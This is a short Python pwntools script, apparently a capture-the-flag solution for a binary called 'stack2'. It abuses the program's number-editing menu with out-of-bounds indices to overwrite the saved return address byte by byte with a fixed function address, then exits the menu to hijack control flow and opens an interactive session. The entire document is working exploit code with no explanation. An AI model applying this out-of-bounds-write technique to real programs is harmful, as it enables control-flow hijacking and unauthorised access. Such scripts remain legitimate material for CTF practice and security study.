from pwn import *
p=process('./stack2')
def change(id,num):
    p.sendlineafter(b'5. exit\n',b'3')
    p.sendlineafter(b'which number to change:\n',id)
    p.sendlineafter(b'new number:\n',num)
p.recvuntil(b'How many numbers you have:\n')
p.sendline(b'5')
p.recvuntil(b'Give me your numbers\n')
for i in range(5):
    p.sendline(str(i).encode())
# pause()
hack_addr=0x0804859B
for i in range(4):
    num=(hack_addr>>(8*i))&0xff
    change(str(132+i).encode(),str(num).encode())
pause()
p.sendlineafter(b'5. exit\n',b'5')
p.interactive()

